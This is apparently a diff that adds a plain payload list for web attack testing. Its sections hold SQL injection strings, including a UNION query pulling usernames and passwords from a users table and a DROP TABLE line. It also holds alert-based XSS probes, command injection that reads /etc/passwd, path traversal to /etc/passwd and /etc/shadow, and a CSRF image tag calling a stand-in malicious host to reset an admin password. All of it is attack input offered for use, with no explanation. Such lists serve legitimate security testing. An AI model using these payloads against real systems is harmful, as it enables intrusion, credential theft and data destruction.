@@ -1,0 +1,22 @@
+# SQL Injection Payloads
+' OR 1=1 --
+' OR 'a' = 'a'
+' UNION SELECT null, username, password FROM users --
+' DROP TABLE users;
+
+# XSS Payloads
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+'; alert('XSS'); --
+
+# Command Injection Payloads
+; ls; cat /etc/passwd
+; uname -a
+; ping -c 4 127.0.0.1
+
+# Path Traversal Payloads
+../../../../etc/passwd
+../../../etc/shadow
+
+# CSRF Payloads
+<img src='http://malicious-site.com/change-password?user=admin&newpass=admin123'>
